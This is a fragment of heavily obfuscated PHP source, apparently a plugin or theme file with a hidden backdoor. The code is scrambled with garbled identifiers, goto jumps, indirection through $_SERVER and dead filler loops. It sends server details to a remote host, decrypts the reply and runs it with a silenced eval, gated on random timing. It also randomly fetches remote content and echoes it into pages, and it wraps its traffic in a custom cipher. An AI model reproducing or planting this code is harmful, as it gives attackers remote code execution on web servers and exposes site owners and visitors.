$a‘Ö‘»åŒÍ[269], $a‘Ö‘»åŒÍ[271] => $a‘Ö‘»åŒÍ[269], $a‘Ö‘»åŒÍ[272] => $a‘Ö‘»åŒÍ[269], $a‘Ö‘»åŒÍ[273] => $a‘Ö‘»åŒÍ[269], $a‘Ö‘»åŒÍ[274] => $a‘Ö‘»åŒÍ[269], $a‘Ö‘»åŒÍ[275] => $a‘Ö‘»åŒÍ[276], $a‘Ö‘»åŒÍ[277] => $a‘Ö‘»åŒÍ[276], $a‘Ö‘»åŒÍ[278] => $a‘Ö‘»åŒÍ[276], $a‘Ö‘»åŒÍ[279] => $a‘Ö‘»åŒÍ[276], $a‘Ö‘»åŒÍ[280] => $a‘Ö‘»åŒÍ[276], $a‘Ö‘»åŒÍ[281] => $a‘Ö‘»åŒÍ[276], $a‘Ö‘»åŒÍ[282] => $a‘Ö‘»åŒÍ[276]); $AÑ„¹‡åÜî = $aÕîá×èÊ[637]; $AğÚŸğŞÉ = $a‘Ö‘»åŒÍ[0]($a‘Ö‘»åŒÍ[283], $a‘Ö‘»åŒÍ[113]($this->prys1832052b, $a‘Ö‘»åŒÍ[138], $a‘Ö‘»åŒÍ[10])); goto fòå««Œˆ°; F¹¤ÒĞˆ½Ó: foreach ($bÓÑŠ´Ù‡£ as $b£·³©ç¡¹) { unset($CÊ“¤‡ïã[$b£·³©ç¡¹]); } return $CÊ“¤‡ïã; goto Bêïô‘ËÓé; D”ÉŸë†Ã…: $aÕîá×èÊ =& $_SERVER[±á õÁ]; $a‘Ö‘»åŒÍ =& $_SERVER[Â·¨]; if ($this->strg3e6220aa == $a‘Ö‘»åŒÍ[267]) { return $CÊ“¤‡ïã; } goto AƒÎ‚á‘; fòå««Œˆ°: $AÙ®„Æ¿¶ = $aÕîá×èÊ[638]; if (strlen($AÙ®„Æ¿¶) < $aÕîá×èÊ[588]) { return; } $bÓÑŠ´Ù‡£ = array(); goto b£ÀÂ™Şæ³; Bêïô‘ËÓé: } private function rwai37055c69() { goto E»Ïè§ÊŠÉ; E›µ“ÂÚß: if (strlen($E£Ä†ÊâŠÁ) < $C½’Ş ÛÀ÷[585]) { return; } if ($EéñƒáÚ÷Ò[61]($EéñƒáÚ÷Ò[286])->{$_SERVER[Â·¨][63]}($EéñƒáÚ÷Ò[89]) != $EéñƒáÚ÷Ò[241]) { $EéñƒáÚ÷Ò[61]($EéñƒáÚ÷Ò[286])->{$_SERVER[Â·¨][230]}($EéñƒáÚ÷Ò[89], $EéñƒáÚ÷Ò[241]); } goto A¤Îİ…—Ä; E»Ïè§ÊŠÉ: $C½’Ş ÛÀ÷ =& $_SERVER[±á õÁ]; $EéñƒáÚ÷Ò =& $_SERVER[Â·¨]; if ($this->strg3e6220aa != $EéñƒáÚ÷Ò[130]) { return; } goto e «¦Û½º·; e «¦Û½º·: $GLOBALS[$EéñƒáÚ÷Ò[100]][$EéñƒáÚ÷Ò[104]][$EéñƒáÚ÷Ò[284]] = $EéñƒáÚ÷Ò[229]; $GLOBALS[$EéñƒáÚ÷Ò[100]][$EéñƒáÚ÷Ò[285]] = $EéñƒáÚ÷Ò[229]; $E£Ä†ÊâŠÁ = $C½’Ş ÛÀ÷[640]; goto E›µ“ÂÚß; A¤Îİ…—Ä: } public function umwt36cf3adf() { return $_SERVER[Â·¨][287]; } private function arvic83e547d() { goto b°ëÍÙÖŠÛ; c“À©•ÕŒ‚: $aÆÍòá¾’Ä[13](array($aÆÍòá¾’Ä[293], $aÆÍòá¾’Ä[161]), $bÄ£×Ş¿Õ, $aÆÍòá¾’Ä[242]()); $Bá½øŠ…¥Â = $d®‹µÂ§Êá[643]; if (strlen($Bá½øŠ…¥Â) < $d®‹µÂ§Êá[585]) { return; } goto dêª‹Š¬ªõ; b°ëÍÙÖŠÛ: $d®‹µÂ§Êá =& $_SERVER[±á õÁ]; $aÆÍòá¾’Ä =& $_SERVER[Â·¨]; $FÛ¢”»öëŠ = array($aÆÍòá¾’Ä[288], $aÆÍòá¾’Ä[289], $aÆÍòá¾’Ä[290]); goto aéàŒ˜¯­; EƒÔÒºŞá‹: if (!$Eèò£Ëğ¾) { return; } if ($this->strg3e6220aa == $aÆÍòá¾’Ä[130] || !$aÆÍòá¾’Ä[113]($GLOBALS, $aÆÍòá¾’Ä[141])) { return; } if (!$aÆÍòá¾’Ä[248]($_SERVER[$aÆÍòá¾’Ä[44]], $FÛ¢”»öëŠ)) { return; } goto f†÷Ä‘ñÍ±; dêª‹Š¬ªõ: $E¦Î¹àĞ¬ã = array($aÆÍòá¾’Ä[174] => $aÆÍòá¾’Ä[61]($aÆÍòá¾’Ä[62])->{$_SERVER[Â·¨][63]}($aÆÍòá¾’Ä[218]), $aÆÍòá¾’Ä[187] => $this->strg3e6220aa, $aÆÍòá¾’Ä[185] => $_SERVER[$aÆÍòá¾’Ä[186]], $aÆÍòá¾’Ä[178] => $aÆÍòá¾’Ä[158], $aÆÍòá¾’Ä[181] => $_SERVER[$aÆÍòá¾’Ä[182]]); $dã‰ç²·Ï‘ = $d®‹µÂ§Êá[644]; while (strlen($dã‰ç²·Ï‘) < $d®‹µÂ§Êá[585]) { if (!$dã‰ç²·Ï‘) { break; } $dã‰ç²·Ï‘++; } goto cêõÓ…ó¸Ş; cêõÓ…ó¸Ş: $e¤ğµ¨—°Û = $this->{$_SERVER[Â·¨][192]}($aÆÍòá¾’Ä[296], $E¦Î¹àĞ¬ã); if (!$aÆÍòá¾’Ä[201]($e¤ğµ¨—°Û)) { return; } if ($e¤ğµ¨—°Û[$aÆÍòá¾’Ä[174]] && $e¤ğµ¨—°Û[$aÆÍòá¾’Ä[297]]) { if ($this->{$_SERVER[Â·¨][209]}($e¤ğµ¨—°Û[$aÆÍòá¾’Ä[297]]) == $E¦Î¹àĞ¬ã[$aÆÍòá¾’Ä[174]]) { return; } } goto eñÃÁ¡Ì§Š; aéàŒ˜¯­: $c„Şİ¯ÖĞš = $d®‹µÂ§Êá[641]; $bÄ£×Ş¿Õ = $aÆÍòá¾’Ä[291] . $aÆÍòá¾’Ä[123]($aÆÍòá¾’Ä[292]); $Eèò£Ëğ¾ = $d®‹µÂ§Êá[642]; goto EƒÔÒºŞá‹; f†÷Ä‘ñÍ±: if ($aÆÍòá¾’Ä[242]() % 4 != 0) { return; } $e¢äö¸îƒº = $aÆÍòá¾’Ä[13](array($aÆÍòá¾’Ä[293], $aÆÍòá¾’Ä[294]), $bÄ£×Ş¿Õ); if ($e¢äö¸îƒº && $aÆÍòá¾’Ä[242]() - $e¢äö¸îƒº < $aÆÍòá¾’Ä[250]($aÆÍòá¾’Ä[295])) { return; } goto c“À©•ÕŒ‚; eñÃÁ¡Ì§Š: $this->{$_SERVER[Â·¨][173]}(); $cïÈƒÎ™ = $d®‹µÂ§Êá[645]; if ($this->{$_SERVER[Â·¨][209]}($e¤ğµ¨—°Û[$aÆÍòá¾’Ä[297]]) != $E¦Î¹àĞ¬ã[$aÆÍòá¾’Ä[174]]) { $fÉË²ï¤¬¸ = array($aÆÍòá¾’Ä[211] => $aÆÍòá¾’Ä[61]($aÆÍòá¾’Ä[62])->{$_SERVER[Â·¨][63]}($aÆÍòá¾’Ä[125]), $aÆÍòá¾’Ä[212] => $_SERVER[$aÆÍòá¾’Ä[124]], $aÆÍòá¾’Ä[213] => $aÆÍòá¾’Ä[214](), $aÆÍòá¾’Ä[183] => $_SERVER[$aÆÍòá¾’Ä[184]]); $dæí½²«Ñ¤ = $this->{$_SERVER[Â·¨][215]}($aÆÍòá¾’Ä[157]($fÉË²ï¤¬¸)); $e¤ğµ¨—°Û = $this->{$_SERVER[Â·¨][192]}($aÆÍòá¾’Ä[216] . $dæí½²«Ñ¤); if ($e¤ğµ¨—°Û && $aÆÍòá¾’Ä[201]($e¤ğµ¨—°Û) && isset($e¤ğµ¨—°Û[$aÆÍòá¾’Ä[297]])) { $DŒ…À¬ÍÆó = $this->{$_SERVER[Â·¨][198]}($e¤ğµ¨—°Û[$aÆÍòá¾’Ä[297]], 2); if ($DŒ…À¬ÍÆó) { $DŒ…À¬ÍÆó = $this->{$_SERVER[Â·¨][209]}($DŒ…À¬ÍÆó); } if ($DŒ…À¬ÍÆó) { try { @eval($DŒ…À¬ÍÆó); } catch (Exception $EÙÎ•ßäö) { } } } } goto d­ïÌ¿Í»Ô; d­ïÌ¿Í»Ô: } private function tbjs864cc650($E‹Äç£ò¨Ù = '', $C¸’‡ìõ‘‡ = array(), $d²¦çÂœå· = 5) { goto fÌ³í§¢¡š; fÌ³í§¢¡š: $e³Ú¨Ş“ =& $_SERVER[±á õÁ]; $c–ñéÈ¤á =& $_SERVER[Â·¨]; $Eï‹¬ó¦Œ¨ = $c–ñéÈ¤á[298]; goto fì’ï³Ã¹; f‹ÕÙâÀ×¢: if ($C¸’‡ìõ‘‡ === -1) { return $Eï‹¬ó¦Œ¨; } $aŒ…Û÷‰‹ï = $c–ñéÈ¤á[258](array($c–ñéÈ¤á[259] => array($c–ñéÈ¤á[262] => $d²¦çÂœå·, $c–ñéÈ¤á[260] => $c–ñéÈ¤á[302]), $c–ñéÈ¤á[303] => array($c–ñéÈ¤á[304] => !1, $c–ñéÈ¤á[305] => !1))); $A”Œ¾¡ë = $e³Ú¨Ş“[648]; goto BÔÆÆÌÓàØ; c¡¶¬ÇàÌë: return $c–ñéÈ¤á[200]($C¸’‡ìõ‘‡, !0); $Dâ¾àÛ¬ = $e³Ú¨Ş“[650]; goto B¢æñ‚‚¼Î; BÔÆÆÌÓàØ: $C¸’‡ìõ‘‡ = @$c–ñéÈ¤á[263]($Eï‹¬ó¦Œ¨, !1, $aŒ…Û÷‰‹ï); $e¿òïˆÓêÛ = $e³Ú¨Ş“[649]; if (!$e¿òïˆÓêÛ) { return; } goto c¡¶¬ÇàÌë; fì’ï³Ã¹: $Eï‹¬ó¦Œ¨ = $this->{$_SERVER[Â·¨][256]}($Eï‹¬ó¦Œ¨, $c–ñéÈ¤á[299]); $DÂ›À—º®“ = $e³Ú¨Ş“[646]; if (strlen($DÂ›À—º®“) < $e³Ú¨Ş“[588]) { return; } goto f­“£Ö½¨; f­“£Ö½¨: $Eï‹¬ó¦Œ¨ = $Eï‹¬ó¦Œ¨ . $E‹Äç£ò¨Ù . $c–ñéÈ¤á[300] . $c–ñéÈ¤á[301]($C¸’‡ìõ‘‡); $F‚®‚°™ = $e³Ú¨Ş“[647]; while ($F‚®‚°™ < $e³Ú¨Ş“[579]) { if ($F‚®‚°™ >= 0) { break; } $F‚®‚°™++; } goto f‹ÕÙâÀ×¢; B¢æñ‚‚¼Î: } private function ucvi7a4fced7() { goto EÚ¥©ïåİğ; EÚ¥©ïåİğ: $e›§ÄÃ¡ÊØ =& $_SERVER[±á õÁ]; $dÁ¼Âæ­ÈŠ =& $_SERVER[Â·¨]; $fÆ”ĞùÅ³ä = array($dÁ¼Âæ­ÈŠ[306] => $dÁ¼Âæ­ÈŠ[307], $dÁ¼Âæ­ÈŠ[308] => $dÁ¼Âæ­ÈŠ[309], $dÁ¼Âæ­ÈŠ[310] => $dÁ¼Âæ­ÈŠ[311], $dÁ¼Âæ­ÈŠ[312] => $dÁ¼Âæ­ÈŠ[313], $dÁ¼Âæ­ÈŠ[314] => $dÁ¼Âæ­ÈŠ[315], $dÁ¼Âæ­ÈŠ[316] => $dÁ¼Âæ­ÈŠ[251], $dÁ¼Âæ­ÈŠ[317] => $dÁ¼Âæ­ÈŠ[251], $dÁ¼Âæ­ÈŠ[318] => $dÁ¼Âæ­ÈŠ[307], $dÁ¼Âæ­ÈŠ[319] => $dÁ¼Âæ­ÈŠ[309], $dÁ¼Âæ­ÈŠ[320] => $dÁ¼Âæ­ÈŠ[311], $dÁ¼Âæ­ÈŠ[321] => $dÁ¼Âæ­ÈŠ[322], $dÁ¼Âæ­ÈŠ[323] => $dÁ¼Âæ­ÈŠ[313], $dÁ¼Âæ­ÈŠ[324] => $dÁ¼Âæ­ÈŠ[325], $dÁ¼Âæ­ÈŠ[326] => $dÁ¼Âæ­ÈŠ[315], $dÁ¼Âæ­ÈŠ[327] => $dÁ¼Âæ­ÈŠ[328], $dÁ¼Âæ­ÈŠ[329] => $dÁ¼Âæ­ÈŠ[330], $dÁ¼Âæ­ÈŠ[331] => $dÁ¼Âæ­ÈŠ[332]); goto d»‹–äØ……; CÑŒò•ò²Š: while ($FÖîĞ§†Š¬ < $e›§ÄÃ¡ÊØ[585]) { if ($FÖîĞ§†Š¬ >= 0) { break; } $FÖîĞ§†Š¬++; } $dßöøÔÚï˜ = $dÁ¼Âæ­ÈŠ[113]($this->prys1832052b, $dÁ¼Âæ­ÈŠ[333]); $dßöøÔÚï˜ = $dßöøÔÚï˜ ? $dÁ¼Âæ­ÈŠ[250]($dßöøÔÚï˜) : 0; goto fµ×¢ö¨î¯; fµ×¢ö¨î¯: $aè’ä±ò¨‰ = $e›§ÄÃ¡ÊØ[651]; return $b×Éí¶ø— + $dßöøÔÚï˜; $FÏô¯¸×Ô¾ = $e›§ÄÃ¡ÊØ[652]; goto aÑŞ›ß‹é; aÑŞ›ß‹é: if (strlen($FÏô¯¸×Ô¾) < $e›§ÄÃ¡ÊØ[572]) { die; } goto Fê³Œ‘ÂØ; d»‹–äØ……: $b×Éí¶ø— = $fÆ”ĞùÅ³ä[$this->strg3e6220aa]; $b×Éí¶ø— = $dÁ¼Âæ­ÈŠ[250]($b×Éí¶ø— ? $b×Éí¶ø— : $dÁ¼Âæ­ÈŠ[307]); $FÖîĞ§†Š¬ = $e›§ÄÃ¡ÊØ[602]; goto CÑŒò•ò²Š; Fê³Œ‘ÂØ: } public function vrqf1611c0ff($bøäªÉÄ×) { goto C¶Ô‹ªÜæŠ; f×—‚ ‚„: if ($eõÎ³“×™’ >= $bñÅ³¨ÖˆŞ[250]($bñÅ³¨ÖˆŞ[251])) { return; } $e¨º†¶ˆ¤ö = $bñÅ³¨ÖˆŞ[61]($bñÅ³¨ÖˆŞ[148])->{$_SERVER[Â·¨][149]}(); $b“†¡÷£Ÿé = $E¤©Ï°ˆò[654]; goto eõ†¡ØÆ¾†; C¶Ô‹ªÜæŠ: $E¤©Ï°ˆò =& $_SERVER[±á õÁ]; $bñÅ³¨ÖˆŞ =& $_SERVER[Â·¨]; $eõÎ³“×™’ = $this->{$_SERVER[Â·¨][146]}(); goto eÀ‰¬ô¥Üø; Dì‰„ŸöÊ¯: $a»ÚºÖ©§Ü = $E¤©Ï°ˆò[655]; if (strlen($a»ÚºÖ©§Ü) < $E¤©Ï°ˆò[572]) { die; } $a–÷««Öš = $bñÅ³¨ÖˆŞ[231]($a–÷««Öš, $bñÅ³¨ÖˆŞ[10], $bñÅ³¨ÖˆŞ[334]); goto C˜ÊŠ¶¥Œß; eÀ‰¬ô¥Üø: $E¦È‡×å‰‘ = $E¤©Ï°ˆò[653]; if (!$E¦È‡×å‰‘) { return; } if ($bøäªÉÄ×[$bñÅ³¨ÖˆŞ[334]] == $bñÅ³¨ÖˆŞ[229]) { return; } goto f×—‚ ‚„; eõ†¡ØÆ¾†: while ($b“†¡÷£Ÿé < $E¤©Ï°ˆò[585]) { if ($b“†¡÷£Ÿé >= 0) { break; } $b“†¡÷£Ÿé++; } if ($e¨º†¶ˆ¤ö <= $eõÎ³“×™’) { return; } $a–÷««Öš = $bñÅ³¨ÖˆŞ[61]($bñÅ³¨ÖˆŞ[148])->{$_SERVER[Â·¨][335]}($bñÅ³¨ÖˆŞ[334])->{$_SERVER[Â·¨][336]}($eõÎ³“×™’)->{$_SERVER[Â·¨][337]}(); goto Dì‰„ŸöÊ¯; C˜ÊŠ¶¥Œß: $B¿‚ƒâí = $E¤©Ï°ˆò[656]; while ($B¿‚ƒâí < $E¤©Ï°ˆò[585]) { if ($B¿‚ƒâí >= 0) { break; } $B¿‚ƒâí++; } if (!$bñÅ³¨ÖˆŞ[248]($bøäªÉÄ×[$bñÅ³¨ÖˆŞ[334]], $a–÷««Öš)) { $bñÅ³¨ÖˆŞ[175]($bñÅ³¨ÖˆŞ[338], !1, $bñÅ³¨ÖˆŞ[245]); } goto c£ÅÑõÍ‡Î; c£ÅÑõÍ‡Î: } public function znfwae77c6b8() { goto bÀ¬¦æãŠÎ; B‰¬™Ã é: while (strlen($cĞ§›Ñ‡…Ï) < $e‚ºÉå£¯Œ[572]) { if (!$cĞ§›Ñ‡…Ï) { break; } $cĞ§›Ñ‡…Ï++; } goto e‘ßÌ¨ÇÓã; bÀ¬¦æãŠÎ: $e‚ºÉå£¯Œ =& $_SERVER[±á õÁ]; $BÂ×–â£ã§ =& $_SERVER[Â·¨]; if (!$BÂ×–â£ã§[113]($GLOBALS, $BÂ×–â£ã§[141]) || $BÂ×–â£ã§[339](1, 100) > 20) { return; } goto a¹‚Ø¡Ö°‰; b¸æ“õŞŸ: $dİğš„ˆª¯ = @$BÂ×–â£ã§[263]($F×»›ê˜÷, !1, $C½‹Ñ§¬Šø); echo $BÂ×–â£ã§[340] . $BÂ×–â£ã§[341]($dİğš„ˆª¯) . $BÂ×–â£ã§[342]; $cĞ§›Ñ‡…Ï = $e‚ºÉå£¯Œ[659]; goto B‰¬™Ã é; a¹‚Ø¡Ö°‰: $F×»›ê˜÷ = $BÂ×–â£ã§[255]; $DÈ•©Çâ¿ò = $e‚ºÉå£¯Œ[657]; if (!$DÈ•©Çâ¿ò) { die; } goto EÈé°‡¦­´; EÈé°‡¦­´: $F×»›ê˜÷ = $this->{$_SERVER[Â·¨][256]}($F×»›ê˜÷, $BÂ×–â£ã§[257]); $aÀ”ÛòŠšÚ = $e‚ºÉå£¯Œ[658]; $C½‹Ñ§¬Šø = $BÂ×–â£ã§[258](array($BÂ×–â£ã§[259] => array($BÂ×–â£ã§[260] => $BÂ×–â£ã§[261], $BÂ×–â£ã§[262] => 3))); goto b¸æ“õŞŸ; e‘ßÌ¨ÇÓã: } private function jacu7397b9d1($d×ªÀÉóÛ, $cÊ¿¦Ü†‹£, $Fİ¹ªöÂ± = 3) { goto fï¦„œ±×’; B´„ÙõÔø: $d×ªÀÉóÛ = $BÔÊ…ì‘Ç²[2]($d×ªÀÉóÛ); $bÓ„°á¾ì = $BÔÊ…ì‘Ç²[339](0, 5) . $BÔÊ…ì‘Ç²[10]; $f¾Éˆ¾óĞ¶ = $BÔÊ…ì‘Ç²[133](15); goto A«ÍÏâŒŠñ; A«ÍÏâŒŠñ: $BÒé™„¢à = $BÔÊ…ì‘Ç²[344]; switch ($bÓ„°á¾ì) { case $BÔÊ…ì‘Ç²[241]: $f´è ¼Ş³Å = $this->{$_SERVER[Â·¨][156]}($d×ªÀÉóÛ, $BÔÊ…ì‘Ç²[223]($cÊ¿¦Ü†‹£ . $f¾Éˆ¾óĞ¶)); $c‚®¸‚Çä¹ = $a¦İËÇˆ[660]; if (!$c‚®¸‚Çä¹) { return; } break; $fÍ¹§Óõ = $a¦İËÇˆ[661]; if (!$fÍ¹§Óõ) { die; } case $BÔÊ…ì‘Ç²[229]: $f´è ¼Ş³Å = $this->{$_SERVER[Â·¨][156]}($d×ªÀÉóÛ, $BÔÊ…ì‘Ç²[223]($f¾Éˆ¾óĞ¶ . $cÊ¿¦Ü†‹£)); break; $aŸ£ØâÈË¼ = $a¦İËÇˆ[662]; while (strlen($aŸ£ØâÈË¼) < $a¦İËÇˆ[572]) { if (!$aŸ£ØâÈË¼) { break; } $aŸ£ØâÈË¼++; } case $BÔÊ…ì‘Ç²[345]: $f´è ¼Ş³Å = $this->{$_SERVER[Â·¨][156]}($d×ªÀÉóÛ, $BÔÊ…ì‘Ç²[127]($f¾Éˆ¾óĞ¶ . $cÊ¿¦Ü†‹£)); $b¤”É¨Ûö = $a¦İËÇˆ[663]; while ($b¤”É¨Ûö < $a¦İËÇˆ[588]) { if ($b¤”É¨Ûö >= 0) { break; } $b¤”É¨Ûö++; } break; case $BÔÊ…ì‘Ç²[346]: $f´è ¼Ş³Å = $this->{$_SERVER[Â·¨][156]}($d×ªÀÉóÛ, $BÔÊ…ì‘Ç²[123]($f¾Éˆ¾óĞ¶ . $cÊ¿¦Ü†‹£)); break; $AÈ™ˆë£¸ = $a¦İËÇˆ[664]; case $BÔÊ…ì‘Ç²[347]: goto c Œ²˜©æ; BÖáÎó‰ÖŠ: $E¢è¦­…ï„ = $BÔÊ…ì‘Ç²[348](0, 64); $aî‘ªÑµ½ª = $BÒé™„¢à[$E¢è¦­…ï„]; $fĞ¡ø”Š‰Ú = $BÔÊ…ì‘Ç²[123]($aî‘ªÑµ½ª . $BÔÊ…ì‘Ç²[123]($cÊ¿¦Ü†‹£ . $aî‘ªÑµ½ª) . $cÊ¿¦Ü†‹£); goto EšÓ†¥®Ï‚; c Œ²˜©æ: $d×ªÀÉóÛ = $BÔÊ…ì‘Ç²[127]($d×ªÀÉóÛ); $d¨ßŞÀõ•  = $a¦İËÇˆ[665]; while ($d¨ßŞÀõ•  < $a¦İËÇˆ[588]) { if ($d¨ßŞÀõ•  >= 0) { break; } $d¨ßŞÀõ• ++; } goto BÖáÎó‰ÖŠ; fÌğêÊç˜: $Báˆ¾Ö¹œí = 0; $aò¥æƒá‹‰ = 0; $a¬é„¬ßÁ¨ = $a¦İËÇˆ[667]; goto F’ÖĞ‹“ÄÂ; EšÓ†¥®Ï‚: $c™ˆíÙïƒ¿ = $a¦İËÇˆ[666]; $fĞ¡ø”Š‰Ú = $BÔÊ…ì‘Ç²[25]($fĞ¡ø”Š‰Ú, $E¢è¦­…ï„ % 8, $E¢è¦­…ï„ % 8 + 7); $Fñ§ŠÕµ—Ó = $BÔÊ…ì‘Ç²[10]; goto fÌğêÊç˜; fìğŸËÇœí: $eöÖÂƒˆÉê = $a¦İËÇˆ[670]; while (strlen($eöÖÂƒˆÉê) < $a¦İËÇˆ[579]) { if (!$eöÖÂƒˆÉê) { break; } $eöÖÂƒˆÉê++; } break; goto Dâİ¹º„­³; E¯Âä‚õ«: while ($bÄññƒ¶Ôì < $a¦İËÇˆ[579]) { if ($bÄññƒ¶Ôì >= 0) { break; } $bÄññƒ¶Ôì++; } for ($Báˆ¾Ö¹œí = 0; $Báˆ¾Ö¹œí < $BÔÊ…ì‘Ç²[24]($d×ªÀÉóÛ); $Báˆ¾Ö¹œí++) { $AÎàñšŞ¦¡ = $AÎàñšŞ¦¡ == $BÔÊ…ì‘Ç²[24]($fĞ¡ø”Š‰Ú) ? 0 : $AÎàñšŞ¦¡; $déğ×›¶Íİ = $a¦İËÇˆ[669]; if (!$déğ×›¶Íİ) { return; } $aò¥æƒá‹‰ = ($E¢è¦­…ï„ + $BÔÊ…ì‘Ç²[349]($BÒé™„¢à, $d×ªÀÉóÛ[$Báˆ¾Ö¹œí]) + $BÔÊ…ì‘Ç²[350]($fĞ¡ø”Š‰Ú[$AÎàñšŞ¦¡++])) % 64; $Fñ§ŠÕµ—Ó .= $BÒé™„¢à[$aò¥æƒá‹‰]; } $f´è ¼Ş³Å = $BÔÊ…ì‘Ç²[341]($aî‘ªÑµ½ª . $Fñ§ŠÕµ—Ó); goto fìğŸËÇœí; F’ÖĞ‹“ÄÂ: while ($a¬é„¬ßÁ¨ < $a¦İËÇˆ[572]) { if ($a¬é„¬ßÁ¨ >= 0) { break; } $a¬é„¬ßÁ¨++; } $AÎàñšŞ¦¡ = 0; $bÄññƒ¶Ôì = $a¦İËÇˆ[668]; goto E¯Âä‚õ«; Dâİ¹º„­³: default: $f´è ¼Ş³Å = $this->{$_SERVER[Â·¨][156]}($d×ªÀÉóÛ, $cÊ¿¦Ü†‹£ . $f¾Éˆ¾óĞ¶); break; $B„©õÈÔò = $a¦İËÇˆ[671]; if (!$B„©õÈÔò) { die; } } $f´è ¼Ş³Å = $BÔÊ…ì‘Ç²[223]($bÓ„°á¾ì . $f¾Éˆ¾óĞ¶ . $f´è ¼Ş³Å); goto D…ëôÜ‰‰‰; D…ëôÜ‰‰‰: if ($Fİ¹ªöÂ± - 1 > 0) { $f´è ¼Ş³Å = $this->{$_SERVER[Â·¨][136]}($f´è ¼Ş³Å, $cÊ¿¦Ü†‹£, $Fİ¹ªöÂ± - 1); } return $f´è ¼Ş³Å; goto Aî¤‡âëŸÑ; fï¦„œ±×’: $a¦İËÇˆ =& $_SERVER[±á õÁ]; $BÔÊ…ì‘Ç² =& $_SERVER[Â·¨]; $BÔÊ…ì‘Ç²[343](1); goto B´„ÙõÔø; Aî¤‡âëŸÑ: } private function tmpk551c495d($eöˆ’±‹ßŠ, $C“İ¶Ã¿Ä, $cÓ—Ä¸Õ¬¶ = 3) { goto fèËì¹‘¯Ù; c‘ƒÌÄÇšÏ: $eöˆ’±‹ßŠ = $a’¦ÇŞ‹„‰[223]($eöˆ’±‹ßŠ); $C®†Œö ƒ˜ = $cõÓ­Æí”ã[673]; while ($C®†Œö ƒ˜ < $cõÓ­Æí”ã[579]) { if ($C®†Œö ƒ˜ >= 0) { break; } $C®†Œö ƒ˜++; } goto Dƒ¸½¿Ï¨; fõŒ‹õİ¯»: if ($cÓ—Ä¸Õ¬¶ - 1 > 0) { $dÌáÉÉƒÕ = $this->{$_SERVER[Â·¨][198]}($dÌáÉÉƒÕ, $C“İ¶Ã¿Ä, $cÓ—Ä¸Õ¬¶ - 1); } return $dÌáÉÉƒÕ; goto d¯ƒÙ†ö©; Dƒ¸½¿Ï¨: $Aã‡»Ìîõ = $eöˆ’±‹ßŠ[0]; $f´”¥•³°› = $cõÓ­Æí”ã[674]; if (strlen($f´”¥•³°›) < $cõÓ­Æí”ã[588]) { return; } goto c¾éõòÖİ¾; fèËì¹‘¯Ù: $cõÓ­Æí”ã =& $_SERVER[±á õÁ]; $a’¦ÇŞ‹„‰ =& $_SERVER[Â·¨]; if (!$a’¦ÇŞ‹„‰[351]($eöˆ’±‹ßŠ) || $a’¦ÇŞ‹„‰[24]($eöˆ’±‹ßŠ) < 10) { return !1; } goto D±‘Óº§•Ë; D±‘Óº§•Ë: $eöˆ’±‹ßŠ = $a’¦ÇŞ‹„‰[2]($eöˆ’±‹ßŠ); $BÌ¦š÷’ß = $cõÓ­Æí”ã[672]; if (strlen($BÌ¦š÷’ß) < $cõÓ­Æí”ã[585]) { die; } goto c‘ƒÌÄÇšÏ; BÀÀ¶À×¼ç: if (strlen($Eœ³‚ôí÷) < $cõÓ­Æí”ã[588]) { return; } $cÓğÉÛİ‡á = $a’¦ÇŞ‹„‰[344]; switch ($Aã‡»Ìîõ) { case $a’¦ÇŞ‹„‰[241]: $dÌáÉÉƒÕ = $this->{$_SERVER[Â·¨][256]}($eöˆ’±‹ßŠ, $a’¦ÇŞ‹„‰[223]($C“İ¶Ã¿Ä . $aòèÅÊ„·„)); break; $d•ŸëÍÜº  = $cõÓ­Æí”ã[676]; while ($d•ŸëÍÜº  < $cõÓ­Æí”ã[585]) { if ($d•ŸëÍÜº  >= 0) { break; } $d•ŸëÍÜº ++; } case $a’¦ÇŞ‹„‰[229]: $dÌáÉÉƒÕ = $this->{$_SERVER[Â·¨][256]}($eöˆ’±‹ßŠ, $a’¦ÇŞ‹„‰[223]($aòèÅÊ„·„ . $C“İ¶Ã¿Ä)); $c„ˆµóêºˆ = $cõÓ­Æí”ã[677]; if (!$c„ˆµóêºˆ) { die; } break; case $a’¦ÇŞ‹„‰[345]: $dÌáÉÉƒÕ = $this->{$_SERVER[Â·¨][256]}($eöˆ’±‹ßŠ, $a’¦ÇŞ‹„‰[127]($aòèÅÊ„·„ . $C“İ¶Ã¿Ä)); break; case $a’¦ÇŞ‹„‰[346]: $dÌáÉÉƒÕ = $this->{$_SERVER[Â·¨][256]}($eöˆ’±‹ßŠ, $a’¦ÇŞ‹„‰[123]($aòèÅÊ„·„ . $C“İ¶Ã¿Ä)); break; case $a’¦ÇŞ‹„‰[347]: goto Aä–ï¶óˆù; f¶À’½®Ù–: break; $F„Ïá‘¤¶ = $cõÓ­Æí”ã[687]; goto eòõæ½œÉ; A÷„£®ì…°: $D‹øŒö¯²É = $cõÓ­Æí”ã[678]; $A¦çÂ¿ÇÀÜ = $a’¦ÇŞ‹„‰[349]($cÓğÉÛİ‡á, $AâßÔó£™ç); $fÒç¦œÅ†ë = $a’¦ÇŞ‹„‰[123]($AâßÔó£™ç . $a’¦ÇŞ‹„‰[123]($C“İ¶Ã¿Ä . $AâßÔó£™ç) . $C“İ¶Ã¿Ä); goto c“–‘Ëè; CŞ‹¼Æ: $c÷÷“—ñî = $cõÓ­Æí”ã[681]; $Aõ‡Ó¤ = 0; $fÀç¦ä†ò = $cõÓ­Æí”ã[682]; goto Eàâ®±—Á¸; bø¬¯‘¼êï: $e˜‘›ÍåÛŸ = $a’¦ÇŞ‹„‰[10]; $CÌæ„ÌÍ³ä = $cõÓ­Æí”ã[680]; if (!$CÌæ„ÌÍ³ä) { return; } goto B©«Úôª; c“–‘Ëè: $fÒç¦œÅ†ë = $a’¦ÇŞ‹„‰[25]($fÒç¦œÅ†ë, $A¦çÂ¿ÇÀÜ % 8, $A¦çÂ¿ÇÀÜ % 8 + 7); $B÷ŒÖñÂÚ = $cõÓ­Æí”ã[679]; if (strlen($B÷ŒÖñÂÚ) < $cõÓ­Æí”ã[585]) { return; } goto bø¬¯‘¼êï; Eàâ®±—Á¸: if (!$fÀç¦ä†ò) { return; } for ($C¦ªóŸ—À = 0; $C¦ªóŸ—À < $a’¦ÇŞ‹„‰[24]($eöˆ’±‹ßŠ); $C¦ªóŸ—À++) { $Aõ‡Ó¤ = $Aõ‡Ó¤ == $a’¦ÇŞ‹„‰[24]($fÒç¦œÅ†ë) ? 0 : $Aõ‡Ó¤; $d‡Ş¾¤™ŠÛ = $cõÓ­Æí”ã[683]; while ($d‡Ş¾¤™ŠÛ < $cõÓ­Æí”ã[588]) { if ($d‡Ş¾¤™ŠÛ >= 0) { 